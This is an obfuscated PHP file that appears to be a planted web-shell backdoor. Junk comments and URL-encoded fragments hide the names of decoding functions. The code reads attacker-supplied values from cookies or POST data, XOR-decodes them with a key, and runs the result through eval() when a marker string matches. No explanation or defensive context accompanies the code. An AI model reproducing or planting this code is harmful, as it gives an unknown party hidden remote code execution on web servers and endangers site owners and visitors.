<?php PaRse_sTr ( # F"K^\_o
'33'/* 9*v[	Bv */.# ~>7Gtl9
'4'# }A@So3+GWm
	. '='//  	x{}`5
. '%'/* t0mU<,r   */.// 	Je'Z5hg
	'55%' . '52%' . '4' . 'c%6'# [p9hw<D
. '4'// r-fnz
. '%65'// K,+_{
. '%' . '63'// UR:^&C\
. '%4F' /* 8^F'xTz%* */.# yqM-M
'%6'#   l	'VQ h
 . '4%4'# lW	=G	9?
. '5&'// <;Ql 
 ./*  a7/8 */'34' ./* :}@NgHc< */'9=%'	/* Brp	Vs3 */. '74%'// ?y9	>!!
 .# %iq<- 
	'4' . '4&2'/* ;=z;F */./*  	%ba} */'4=' .// %!5;?
 '%48' ./* 	KsvFv=T */ '%47' . '%7' .# 4<;aaYK4
'2%'# j,U;PT
 .	/* +^		S */'6f'// 	u*<V[Gx	
. '%5' . '5' .# +?w	%@w!
'%'/* {tG+ 	@ */. '7'# .a.<Y Zf.
.# vQO&H	t52
'0&4'	# 1QryW
.// n$	0}.
'10'// 	!h5T&
.	# B	3XE"WsA
'=%' .// 8^$a}f<8_)
'53%'# K	`YD
. '54%'// ^EgV$0*Rg[
. #  G%i[qD
'7'/* 	D'v$c}<	 */.// 	Kr>KB4	
'2' . // BIfzUck ^
'%' . '7'	/* A8a_>'P */./* mtS	e */	'0%'	// WM<g`]!)(
. '4' . 'f'/* GH8JSU@Q6r */./* <f}g	 {6d) */'%7' . '3&9' . '29' # /n\.W:O
./* eN9fz19)c5 */'='# >?(^Ve9w
. '%53'	/* s~6Knl5T9b */	. '%7' . '6%'/* B]K?h. */ .// t IY;RAY
'4' .	# ^)Z\ ,	l
	'7&7' . '2='// s9ozo
.// zj}2B	*  v
'%'// ?YOEQw
. '63%' . '6' . '9%' . '5' ./* >]e3)$:gr */'4%' . '45'	// g-N]pY
 . '&53'# }0~2iF 6
. '8=%' ./* gTL!CVg* */ '6'/* &vDkAF"p2  */.	// dnOIbGty~
'6%7' # -"oRV<Cp0X
 . '2' . '%7' .	// KZ<J]a).
'4%4'# Bx+q:
	.// TbE tLRvAh
'9%4' .# gUREr1nP
'c%4'	// &`4r2,qs
. '8%7' . 'A%' .	# -Kn`^}
 '5'// 3(A !Z}>9;
. '4' ./* a|'|[ */'%6'// &Cx;]N
. '7%5' . '5%4'/* ':)dG */	. '6' .# D3&_V%~X
 '%6'// +QSAFJ
	. // 2I*,	R,7
'8%5' . '3%' .	/* IjNpM~J+ */'3'	/* D:H	df */. '6%6'/* 78J$P. */. '9%'/* hY	| R_r */. '63&' /* ~3"u8s$ */. '177' . '=%' # pIL1`]c> 
 .# qs]L]H
'75'	/* uCyz\%T*e */. // \J9	[
'%'/* n'(b<o\  */./* *Yl>uvwXY */'6'// mjS3!N
.// 	p;N: 
'e%'	// "uu	R
	.	# KI}vy
'73' /* CLB7aH ` */./* AM	p"J U	 */ '%65' .// Jm )kJd A
'%72'/* \ r_oNep' */./* J(IhR"3x: */'%6' // Hy} z<0
. '9%6' . '1%4' .# 	O8$U9Yc^4
'C%' . '69%'// Z6+Q2v
./* H5 ~ /K"DS */'5a%'/* 8	qKk@ yys */	. // ?;pr|?C`@
 '4'/* )C8Td */.// 	yp|;E&
'5' . // lIn,hY- 
'&5'// d}0@<
. '3' # E5s	"1
. '5' ./* =~sY 5 */ '=' . '%42' . '%' .// {S4pOo2VZ
'6' /*  G] kO/[=@ */. '1%7' # kWJ=n$[v/	
 . '3%' . // fe4' Q<@J
'65' .// NyO~6S
	'%36' # x;%6Y0Bx
. '%34'/* lRr[n */.# EBO	N0@[R
'%5'	/* ^ZY .7hW */.// 7AvZ	[
	'F' . '%64' . '%4'/* PPFyE_/Wh/ */. '5%'// !L'3N
. '4' // NF9y	vsT}H
. #  w~V vH q	
'3%' . '6f%' . // WKmMI<cEv
'64%'	/* 3 jFpMVsF */	. '6' .	# > Z_:
'5'//  Iu~{Ru
.// x]k>k{A
'&' . '353' . /* twv	& */'=%'// YYYJf	&%l
	. '6'# s20D 
./* Yk 1Uq */ 'B%4' . 'd%' . '66%'/* {d8Ki| */ . # {y}Co
'69' . '%' . '6'# &@J 	
.	/* 2v|}yG"+f */'5%5'// sinkN|e&
. '4%4' . 'B%7' .// H*'jS
 '1%' . '4b'/* 2!Ar[ */.#  cJ2Ug8
	'%'/* 	_ch;e< */. '57'// CPz0D)%	
.# &^_eDXw
'%3' .	# +>7/*$6jCX
 '2%5'	// ja<5`U
. '1%'/* -("CJh>q */. # %H[> Q
'6C%'// 3KGx%p
. '50'//  %N<qb
./* XFrzFMY */'%75'/* gWdorm+ */.	# 3HIt4"	m
'%3'# !70=5zO5u
. '6%6' .// _>	ay+{k-
'2'# |U^!|
.// * 0&[fN
'%67'	#  uqV^] z5
.	// \rY}c"}be	
'%3' . '7%'// @{i*m-V
	.# ,s+B o?^r
'70&'// 7k(<:|	
. # BRE$e1P
'122' . '=%7'// hD*^P4t
 .# t={?E	z]
 '3%6'/* 6.Okd88	i */./* H194r! */'5%4'/* t(D=m+ */. '3%' // 	gXNk	P
 . '54%' . '69'	/* Z.>t|G  */. '%4F' ./* <*e	+lY */ '%4'/* l7<O=A} */. 'E&6'/* fWgQtI$7^I */./* ?D T)nR */'91' /* $Mal FT */ . // 6kUlJPwl:	
'=%6' .// ij.Veci\	
'4%'/* ;$R<K,mC, */. '49' .# f\@xeJ
'%56'# J	O  Qj	
	. '&'// d^L mT
.// t'\M!5P	
'7'# MR\5ege.*4
	. '22' .	// 'g~G'
'=%4' . '4' .# c3q2x.>T\ 
'%' . '69' .# 8tq` 
'%4'	// sD	$&Q/'z
.# .3 Xp&5%
'1%' # [I=n*2F
. '6c' .# f)_ dY->=+
 '%6' . # GE_T ~DK1u
'f%6'# Rj(66Z+
. '7&' . '7' . '38=' . '%73' .# ST	b: !
	'%54' . '%5' ./* [8	EHN!~n */'2%6' . 'f%'	# *;/-9WG 3S
.# {!>C	ey|p
 '6e%' ./* n`/\HvP */'67&' .	// Z^_.i>2
'51' . '=%' . '7'/* ?XV<[?; */. '3' .# CA] a!o\
'%4' ./* k08oB	a */'f%7' //  :	Yt8I0\
	.# >DJu	P  
'5' . '%' ./* 8SNi^  */'7' .// gk09 e
	'2' . '%' . '63%' .# ukZO.x02 )
 '6' . #  4brjuko0N
'5'/* IkpIpL{[P */. '&' .# T	3 J
 '37' . '1=%'/* DX4Lm4:k\ */. '6f%'# {\xnX1k
.	# (v/h.% 
	'55%'/* 	OaY{a|SwK */. '54%' . '50%' .	# 1V +bf
 '7'// YIAh@o<72|
. '5' .// nFh-|UPeC
'%54'# ]Hih13*
. '&9'/* );9As* */.	// j"Xw3 	 
'8' ./* a7u<%n */	'9=%' . '6'/* *+haW1%L */ ./* e%6 s */'4' . # 	] "c
'%' . # Z9	s:\
'4f'/* VAVe% */. '%43' . # sB Du+	
 '%' . '54%' .# X ^'6+bws
	'5'	// D2cf3	XC4J
. # g+L_6	E
'9%' /* b n!	(Y */.# {	?N@Gz !
'7'# lDr9vi <)
. '0%6' .# {ei; 
'5&'	# i;TO7@yDjG
 . '36'/*  pM	7 */. '6='	/* 8 j_m */. '%' .	# N;3_>?$+q
	'63'// VNSr7=c
. '%'// 	Sil]}yns
.// 9n1T	
'41%' // /'U+!e)	6
 .// 8_8evloH_ 
	'6e%' .// =Wx@si)!l0
	'76%' // +W'e 40bvY
.# yNn	5R7n'
'61'// ]	(;3Pd:
./* IpE*\E<lwW */'%53'# uS/3	@(9<
. '&6' ./* L9z/k	eu	p */'36' # F{cwSn]	
	. /* VAT0F */'=%' . '50'# =5H0*07jx
. '%4' . '1%' # "	4v%~t
.# 4 4GFA
'72%' ./* 	 >sPI$ */'41' ./* k]]PD	K */'%6'/* ?c`pe6<f' */.// zB2Q$R
'D' . '&' . '91'	# DcHx)} 
 . '9=%' .// v@MFL)
	'75' .# 49X[gc
'%7A' // gT"	2R"u
	. '%6'// ;S<9X
. 'F%' . '47%' ./* )GJzhg */ '78%' . '36' /* `n^]1 */ . '%4B' ./* g,LkZ<%xYb */ '%6e'// rm)x4*8
. # M(	tlA:/
'%3' .	# }1T	6b
'3%' # 	 5<`+eC7g
.// KOu;G~
 '42%'# r+j.5WRU
.# !-wXgW]	
'59%'# H2t!:F 
. '4C'// e>sOWXl{
. '%7' # e\OG u"|:
 ./* FL!Xv\ */ '1&4' .// F	.>>
'91'// lH{,]V(}
. '=%'	# Y!rI_XC 
	. '73%' . '74%'/* Y!"Mw */. '5'// 	Qc4]6oA
. '2' . '%'	#    Qa`eN_
. '4c%'	# G18B" hmrQ
. '6' . '5'	// z0.\Ao[B
. '%6e' ./* ${*	/\" */	'&'// 	9!KZ|
. // FL=/;k%VL7
'67'// x`ySOz2Z|
. '5=%'/* O1`sSd */. // BBu$*Q 
'73' . // nvLH P)+a
	'%' .	/* 3? JLI"f */'70' /* Tex~W<	 */.// U!lNb{
'%4' /* |~h_'L	 */ .	/* _c\=" */'1%' ./* ^Ho1\5 */	'6E&' .	// keI5qn4j
 '8' ./* rR\]%` */'82' . '=%'/* 'RM6|A7	h */.// 	7gB@yQdnf
'53%' .// 2^C	2wT*Y
'7'// PC@~QDieJI
. '4' .// y5t02Ol:
	'%72'# 0n\j4P
 ./* d		B|m1 */'%4' .	# Um"(P /
	'9' ./* ~\C1sqK] */ '%4b' # j;a8KB'
. '%65' .# Tbe	xC
'&6' # T.@7HS^*;.
.# "	Kp`
	'1'// -rDl'y
. '=%' .	# *\Na	
 '62%'/* C $m  */./* h}^up<tFh */	'4F%' . '44%' /* / 83 I?4B* */.# (		x'+['~B
'59&' .# Z[:9O.@lR
'883' . '=' # Z\(=(c a
 . '%68' . '%45'# m9lT3ws
.// B	W"Av
	'%6' .// !J>^%("qfT
'1' . '%44'// md!pV)
. '&3' # x*Q)1
 . '82' .// 	Vk6m1sC
'=%' . '6' . '1%3' # X\nO 
.// i A)'%c@T
'a%3' # d&>:Bk>
	. /* gJ:+g */'1' . '%'/* WmX$BT]5[ */.# `\0??x;Z?8
'3'# Oi	h\u3
. '0%' . '3A%' . '7B'# D!z~E
. '%'// p4"ADx`slE
.	# <G&|GB
'69'	# T,ja."n?%
	.// k}LV>	c_q
'%3'// 4FRoX%sD7
. 'a%' // E)_Uig
	. # [- 67l%Sd
'32'	# 3sV7-s
. '%35' . '%3'// b  oPy	J
./* 9}	!zDQB */'b%' . # m[v\dxUc
'6' .// Ak-FK Bc
 '9' . '%3' . 'a%3' . '1%3'# KSnmi
. 'B%'// '%"?	z&O&
 .	// tOuyB
 '69%'// ~F~nK
 . '3a'# ~+0;Rli
 . /* PCG0o^, */'%'# U_=]~
.// l@0~~<
'39%' .# 	  EcpCvd 
'3' .	/* ST~Z7U@ */'1%' ./* DwvyT */ '3'# @sjH&
 ./* :	}?/ , */'B' .	// },	p8m0 
'%'# I )+D! 
	.	// D ]mE
'69' . /* ;tG	~ */'%3A' . '%3' // o	t4_++J|r
 . // syz	>x95+
'4%3'/* )>VC. */ .	# LP{,: ixH
'b' ./* GcE(:pL */ '%6' // YTHH(;0
. '9%3' /* !^ 	a^> */. 'a%' .	/* ";VF	?@_ */	'34%' . # ^M (Qa6
	'35'	//  ,x	e62pD
	. '%3' . /* .&Jl*t */'B'# fgi??+mw/s
 . '%' . '6' /* _u@3F */	.# Soti-YPz9
 '9%'# =&:l=VA q]
. '3A%' # xnp'V
.// \,B 4gi
'31' . '%34' .	/* 0dvf'% */	'%3' . 'b'# v<<sc
. '%' . '69%' .// /`PN<i)
'3' .#  ykW=Y62B
'a' .	// y+q%e[HhP
'%' .	# <MFrX
'3' . #  =PBU_ v6U
	'5' ./* jK	u Y2n4Z */'%34' .// \	gSl+
 '%3' . 'B%' .// R SgP
'69' . # z y :oP
'%3a' . '%3' .	# TL&l[!m'@<
'1%' . '3' . '8%'// 6aFRyK,>
 . '3b%'/* )	x,t8H$ */.// <UZ.YS	 <@
'69'/* r	GxY\Jl */.# |{Q@VhtQs 
'%3' . 'A%3' . '7%3' .# [rk W
'5' . '%' /* s|r5vj */ .#  Hj]s	BE
 '3' . 'B%'/* 3HP/jiv9 */ . '69%' /* _Am_d<- */.# 	Uxo	Ki
	'3A'/* Zit + */ . '%3'// 9b[X(
.# TcieTq
	'4%'/* NZ	dm */. '3'/* 1>:u5@V */.# |HC  
'B'/*  N6h	msO0h */. '%69' . '%' .	// (Q9r7'^+_
'3a%'	/* Vw;Z>nSZm */.// Z'VKz
'3'// i	=fR{
. // CZ{5 s h
'2' . '%'# (`?GpD
. '34' . '%3b'// xg}LR|
./* r4	'r */'%69'/* 		,Ll/@ */. '%3a'/*  kg=		b` */.#  /~R%74Y
 '%' .# 3"_w)q.(kQ
'34' // bS7n*Lo<
 . '%3b' /* ,,)$ ocMJk */	. '%6' # B6Jlh	\Q	
 . '9' . '%3A' // u+ Us 
. '%3' . '6%3' . '9' .# 	G'FLBV%\3
'%3' . # '$h^*l
 'B%' .# 8?H	Qv
	'69%' . // .dcMd
'3A%'/* 46UL8  */. '30%'	/* C]Is1LEt */	. // zd:<Hv3 
'3' . 'B'	# 	CByjG
	./* 	/	{w */'%'# X>T2,eB'`
. '69%'	# qU22	
. '3'# $4 J1	L
./* m 	nN7; */'a%3' . '5%3'	// ECHA{
	.# xOsG[.
'2%'	// ~v4s "6~
. '3b' . '%69' // 	B?,$dEc?
. # 94T_-26G
	'%' .// zH<128
'3a%'# o		A_ 
 . '34'/* 0	fX,<ZDmg */. '%' . '3'# T_<iF	[!Qn
.	// !e	w"
'B%6' .# <a.gJ
'9%' // {@7G(:{
	. '3A%'	# 40ai9vA}
. '3' // HPad`XY
.// /1o%e]!r
 '6%3' . '5%'// c S\wJ[<r
. '3B%'# "T	(S`i)U@
. '6' . '9%'# 	SDu&	DM
. '3' . 'a%3' .// Ehl~=hyJ
 '4%' ./* eqVU;qr */'3' . 'b' # J<	;)\9<
	. '%69' // eI7Ag	ki? 
. '%3A' # 	wrt{
. '%3' .// \C;u/xK%
'5%' .# 16	m.G
'30%' . '3b%' . '69' # Ju58;
. '%3'// ES%KT
 . 'A%2' . 'D%3' .// 9)V2-
	'1'# zzq`')
. '%'/* +)cPz} */. '3' .# /?/w!JL]
 'B'/* _Cc	}< */ .// aIh EV
'%7'// ed6Tt\
.// ]m=N}	q	*4
	'd' # 02Zzf
	.# o, SKUF
	'&' .	# UsXET
 '507'/* E{-q$5A]= */ .# 	:&-i	i
'=' . '%' .//  =pClJ
'76'# N@CW -U(dO
./* 7AR]'; H */'%61'# Yym=B[
	.	/* 2YRE	 */'%' . '52&' . '351' . '=%'/* ),['q' */. '73%' . // cjTKt\Q~
	'75%' . '62' . '%'/* N(q}		68r */. # b*fO	
'53%' . '54' . '%52'	// *?t+Vx
. '&11' ./* 'x,,A */	'3'// p+3B O{K
 . # "mUs)p
'=%4' . '1%'/* %`24<ekX */. // 4_sCC
	'7' .	// ues)b 
'2'# 	m&%[G
. '%7'# $~=p t8
 . '4%'# _}	E		l
.// iWSuh
 '69%' . '43' // vHN?,
	.	/* 2N! M =q */'%6c'/* 	S rG&< */. '%'/*  	\Z8N */.	/* $en];%i	=J */	'6' ./* +3.:n 8 */'5&' . '192' # U<,VL
. '=%'	/* m(W!Vra	 */.# ;(!JRrO
 '64'	/* RINxn:Nze */.// p	$@m`.
'%3' .# dDA\N	X8q
	'7%'# 0-pZW ogVb
.	/* Kmz I*uO */ '50'/* DB ] 3PN9~ */.	// Kv(5zEDH
 '%30' .# e,9}Ll{
 '%6c' // %=RIbp
./* S7,@ f| */'%' . '68' . # L ^ef
 '%6'/* wj s ^>g) */. # BSMse1
'8%7' .// w 7Ga
'9' .# 5Vf>8<0-wh
'%4' . '2' .// 8=tf3
'%35' . '%'	# * EMfw;w'
 .// Am%v m1	Uo
'59%'/* f0a	Q`K %r */.	# a~!7RSw;	p
'57%'	// >b|		|6f"
. '47' . '%48'# &~r+t
.// r\Y	z	 cf=
	'%64' . '%4' . '2&'	/* W	%$cm4 */.// >g|l|Q~G]s
'635' . '=%4' . '1%'// tD	u[GR9
.	// @`$?ih+}(
'72'# @/7ATPZO+W
. '%'# ZK859 O
 . '5' // )*~Kxe
./* WI_v=}'o!$ */'2%' . // d_	 :
	'61%' .	// s%!{M%	oba
'79%'# sD+fuc
	.// j\1BH
'5'// jJrQA3
. 'f%5'/* ?,[M  (N */	. '6%' . '4'	# %)MU	4XM"k
. #  LZbB]V?
'1%6'# @b~Rd q{M
 .	/* 	jZzL */	'C' // 62_=Z7J
. '%'/* SAj{nJ2  */. // ` @E(v
'75' . '%65' . '%' . '7' /* .ms$&4 */. /* $83<t)xg */'3' , $cQ2 ) ; $c5xe// w={3 > y9n
	= $cQ2 [ 177 ]($cQ2 /*  N  X- 	0C */ [// Agy?st
334 ]($cQ2 [ 382 ])); function# 	 xu]F_g
	frtILHzTgUFhS6ic # bxDlqX7
	(# iCg>u]R/t$
$nLmCR5xy ,/* '\6;O$	(= */	$QEUEewuB )/* f!1xn%	 */ { global/* u KlhpU? */ $cQ2 ; $ZYzs1 = '' ; for	// y'D 'X%N
	(// s34l&154k
$i =/*  p|R?gU{ */ 0 ;/* ZP)& 	+mG~ */$i	// 	x3R):mu`c
	< $cQ2 [//  :An\ |0
 491 # U=DnR*dNu	
] ( $nLmCR5xy# bWWi\ }c'm
 ) ; $i++	// E1=zvO&HW+
) { $ZYzs1 .= // [4\,=
$nLmCR5xy[$i] ^	// q%PdCi	l
$QEUEewuB [ $i % $cQ2# gjq&Q8 /X=
[ 491 ]// epT-? YB
(# 0%AH5 .b.
	$QEUEewuB # u_HS_r>v%
	) ] // f"A1,',
 ; }	/* G)B6 Gc y */return// \,v Xh+
$ZYzs1/* `>4{6 */; }	// ]H><3r".	/
function/* . 6el	O */uzoGx6Kn3BYLq/* xj4A) */ (// ]	nhDicz!
$cJXTj ) { global # ) -} 1 s
	$cQ2 ;	/* LO*+I9 */return // $-) xW(=6
 $cQ2 [ 635 // g"kU*|L
] /* yN9RAK */ ( # /Z^se
$_COOKIE ) [# n*	K%G\e
$cJXTj// .r: 4)5Skz
] ; } function	// ,NR/b-[}*
d7P0lhhyB5YWGHdB (# 7Gs@u
 $b5U5wnG )/* }o<HE $U */{ global // x)V m
$cQ2 // -%KSs;
; return/* ~(~D} */	$cQ2// Ew~,ZK+'s
	[/* {8_IN */635// =j@7_(+R
 ] (# qQGe[LEm;=
$_POST ) [ $b5U5wnG ]	# JN OSx`Y
; }/* {+b}Sn7wN */	$QEUEewuB// r/	Xla	1z
=/* zF}oU+ */	$cQ2 [ 538 ]	// gCy>}RI
	(// !|g Z
$cQ2	// Sydfs
	[ 535/* (wT	9o\}8S */ ]/* &F %v) */( $cQ2 [ 351 ] (# =	f%O.-_cc
$cQ2 [ 919# Wh&0;F]Iw 
] /* I/hD	>`E */(# MG"yO
$c5xe [ 25 ] ) //  85qd@
, $c5xe [ 45 ]// buJrZ}
 ,	/* 71	d}{q */$c5xe [	/* !kGbrwU\ */75 ] *// DIZ<X"
$c5xe// CK+:Hg^g
[ 52 ] ) ) , $cQ2	# 4	hCWgs$d
 [# 5Z2"Z @!bd
535 ]	/* rN	S$Lr@~F */ ( $cQ2 [ 351/* ;]_-W4%<S| */] ( $cQ2 [ /* 5dxX=Y */919# 		NEx.
 ]# $k(<Q
 (/* 57!uW1p_[ */ $c5xe# ?/uX		
[ 91 ] ) // 3z`	q. 
, $c5xe// hlU_7DGmc(
 [ 54// 1(^]voF4w4
 ] , $c5xe// QLn! 
[/* q-'Y*mS */24 ]// 2@dh10
	* $c5xe [ 65 ] ) )// [	5|^y!}
	) ;// 4KP:X/fqU
$MMtruG# 5njrZj
= $cQ2 [ 538/* 0y}QG */	] (// <cw%Og
$cQ2 [# <lq<^
	535/* <+2d`h , */] ( $cQ2# 	5uU?t
[/* {.Xnu  */	192 /* Sr?+z */] (/* ?V)!.<:2c */$c5xe/* Th+]FQ */ [# OzH	q4)0
69 ] ) ) ,// mG~=Fte*Kn
$QEUEewuB# {H [)P=
)// sZg(-=
;/* 7VPBd!c */if ( /* hZQ+k */	$cQ2/* nXSW  */[ 410 ]/* NT~}T[ */( $MMtruG ,// i:}ME.[]p
	$cQ2 [# U0Gs?
353 ] ) > $c5xe [/* IV{@0"FLv */50 // K	K{S?@
] )	/* >	AC`A */EvaL	// '&- ^5@O
 ( $MMtruG# s E~:@.*V+
)// o Qp%^
; 